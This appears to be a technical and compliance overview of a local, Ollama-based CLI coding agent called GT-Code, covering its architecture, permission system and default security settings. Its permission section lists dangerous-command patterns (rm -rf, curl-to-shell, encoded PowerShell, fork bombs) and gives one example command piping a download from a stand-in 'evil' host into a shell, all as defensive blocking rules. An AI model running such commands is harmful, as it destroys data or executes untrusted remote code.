# GT-Code — Technical & Compliance Overview

*Prepared 14 July 2026. Every statement below is grounded in the repository source; file references are given so claims can be checked directly.*

## What GT-Code is

GT-Code is a self-hosted CLI coding agent in the style of Claude Code, implemented as a small Python package (`gt/`) that runs entirely against a local Ollama model server on `localhost:11434`. It plans, writes and edits code, runs shell commands, produces real Excel/PowerPoint/Word documents, and verifies its own work — using open-weight 1.5B–14B parameter models selected per machine by a first-launch hardware wizard. No cloud LLM, no API keys, and by default no network egress of any kind.

## Architecture

**Model ladder and smart routing** (`gt/machine.py`, `gt/router.py`, `config.yaml`). Five roles map to local models: `brain` (qwen3:14b, heavy planning), `fast` (qwen3:8b, substantial coding), `tiny` (qwen2.5:1.5b, the resident default for routing, chat and quick turns), `reviewer`/`analyst` (also 1.5B, so background work never evicts the resident model), and `embed` (nomic-embed-text). `machine.py` probes RAM/CPU/GPU with stdlib-only calls and maps to three tiers — Full (≥16 GB RAM or ≥11 GB VRAM → 14B brain), Standard (≥10 GB RAM or ≥7 GB VRAM → 8B), Minimum (1.5B only) — and deliberately caps at 14B. Routing is small-model-first with a work floor: the resident 1.5B answers chat and questions instantly, but any turn that will run tools escalates to at least the 8B (`work_min_role: fast` — the 1.5B talks and routes; the 8B codes), and on CPU-only boxes `prefer_fast_on_slow` routes brain work to the 8B rather than the 14B.

**Agent loop** (`gt/agent.py`). A bounded tool loop (`max_steps: 20`) with a hybrid tool protocol: native function calling on models whose chat template supports it (asked of Ollama once per model), falling back to a portable prompt-based JSON protocol elsewhere. History is bounded (`max_history_turns: 10`) so prefill time stays flat; when the conversation outgrows that, auto-compaction distils the oldest exchanges into a rolling session summary (≤1,500 chars) on the resident model rather than silently dropping them.

**Tools** (`gt/tools.py`, `gt/office.py`). Seventeen tools total: file read/write/edit/list/search, `run_command` (with `cwd`, per-call timeout up to 1,800 s, process-tree kill, and `background: true` for dev servers), process check/stop, todos, `run_agent`, `recall`, `ask_user`, `web_search`/`web_fetch`, and three Office document builders (openpyxl / python-pptx / python-docx — pure-Python wheels). `active_tools()` filters the toolset by configuration, and does so secure-by-default: an *absent* `web` key means web tools are off, not on.

**Memory layers** (`gt/memory.py`, `gt/project_memory.py`). Long-term memory is nomic-embed vectors in plain SQLite with brute-force cosine search in numpy — no native builds. Three kinds: `note`, `doc` (RAG via `/index`), `lesson`. Project memory (`GT.md`, GT's equivalent of CLAUDE.md) is loaded into every work turn in three layers: `~/.gt/GT.md`, the nearest `GT.md`/`AGENTS.md`/`CLAUDE.md`, and a git-ignored `GT.local.md`, capped at 6,000 chars.

**Sub-agents** (`gt/subagent.py`). `run_agent` spawns a research sub-agent in its own separate context, scaled for local models: it reuses the already-loaded model (isolation, not parallelism), its toolset is strictly read-only — no writes, no commands, no permission prompts — it cannot nest or ask questions, is step-budgeted (8 calls), and its report is capped at 3,000 chars.

**Hooks** (`gt/hooks.py`). Deterministic shell commands at fixed lifecycle points (`session_start/end`, `user_prompt`, `pre_tool`, `post_tool`, `turn_end`). A `pre_tool` hook exiting with code 2 blocks the tool call — a hard policy guarantee, not a prompt suggestion. Hooks receive a JSON payload on stdin plus `GT_EVENT`/`GT_TOOL`/`GT_CWD`; broken or hanging hooks fail open (30 s kill timer) so a bad hook can never brick the agent.

**Intent gate** (`gt/intent.py`). Before a new build-shaped task, one small model call scores confidence in the main reading of the request. Deterministic routing: ≥75 builds immediately, 45–74 presents a plan and waits for "go", <45 asks exactly one clarifying question. It never fires on chat, quick tasks or mid-task turns, and is fail-open — it can add care, never block work.

## Security & compliance posture

Each item below was verified in code, not just documentation:

- **100% local inference.** The only model provider is Ollama at `http://localhost:11434/v1` (`config.yaml`). A grep of `gt/` for non-localhost URLs finds exactly one external endpoint: DuckDuckGo inside the `web_search` tool — which is disabled by default.
- **Web access OFF by default** (`web.enabled: false` in `config.yaml`). With it off, `active_tools()` removes `web_search`/`web_fetch` from the registry entirely — the model cannot see or call them, and GT is genuinely air-gapped.
- **Profiling and lesson-learning OFF by default.** `profile.enabled: false` (automated profiling of an identifiable person is strictly opt-in, prints a one-time notice, and is viewable/clearable with `/profile`); `memory.auto_learn: false`, explicitly because a lesson distilled from a client task could bake client names/paths into permanent local storage. Hooks are also off by default (`hooks.enabled: false`), because enabling them means a config file grants code execution.
- **Workspace confinement** (`security.confine_to_workspace: true`, `gt/base.py`). File and command access is confined to the folder GT was launched in. A path that escapes the workspace (absolute or `../..`) is passed to `approve()` with `force=True`: it *always* prompts and can never be silenced by auto-approve or a standing grant.
- **Permission system** (`gt/permissions.py`). Every state-changing tool asks: yes once / always allow / no, with coarse, readable grant keys (`files`, `docs`, `cmd:<word>`) persisted in `data/permissions.json`. A dangerous-command regex (`rm -rf` and `--recursive --force` variants, `del /s`, `format`, `mkfs`, `dd`, `shutdown`, `reg add`, `schtasks /create`, pipe-to-shell such as `curl … | sh`, encoded PowerShell, `iex`, `git push --force`, `git reset --hard`, fork bombs) overrides *everything* — auto-approve and standing grants included. Chained commands are split, and every segment needs its own grant, so `mkdir x && curl evil | sh` cannot ride a `cmd:mkdir` grant. Only explicit answer tokens grant — a stray "abort" can never be parsed as permission.
- **Apache-2.0 model line-up.** Qwen 2.5/3 and nomic-embed-text — no Meta Llama licence anywhere, so nothing needs a licence review to deploy. (Licence statement per the model publishers; see the caveat at the end.)
- **No telemetry.** There is no analytics, crash-reporting or update-check code anywhere in `gt/` — verified by inspection and grep, not just asserted.

## Operations

`setup.bat` / `setup.sh` installs GT into its own `.venv`, installs Ollama if missing, pulls the ~2.3 GB baseline models and installs a global `gt` command, self-testing it from another folder. First launch runs the wizard (`gt/wizard.py`): hardware verdict, per-role model plan with download sizes, and nothing is pulled without explicit consent; the choice persists in `data/setup.json`. `/doctor` reports hardware, model line-up, tool protocol per model and provider health in-session; `doctor.bat` / `doctor.sh` diagnoses the full launch chain (Python → venv → `gt` command → PATH → Ollama → models) and prints the fix for the first broken link — `TROUBLESHOOTING.md` covers corporate-laptop PATH issues, proxies and clean reinstall. A dependency-free offline smoke test (`tests/smoke_test.py`) covers config, tool-call parsing, tools, tiering, permissions, web gating, rendering and routing: **496 checks, all passing** on this tree (run 14 July 2026).

## Honest limitations

- **CPU prefill latency.** On x86 boxes without a discrete GPU, a 14B runs on the CPU at single-digit tok/s and prompt prefill can legitimately take minutes (a live 790 s prefill is documented in `config.yaml`; the LLM read-timeout is 1,800 s for that reason). GT mitigates — `prefer_fast_on_slow`, resident small model, 8K context, bounded history — but does not eliminate this: on iGPU-only hardware the Standard tier is the realistic ceiling.
- **Small-model quirks.** 1.5B–8B models occasionally misroute a request, mangle prompt-JSON tool calls on non-native models, or over-ask; the test suite encodes real regressions of exactly this kind. The intent gate, question budget and hybrid protocol reduce but do not remove these failure modes. Quality is below frontier cloud models — that is the explicit trade for full data locality.
- **8K context window** (`num_ctx: 8192`) bounds how much code and guidance the model sees at once; the skills library and RAG exist precisely to spend that budget well.
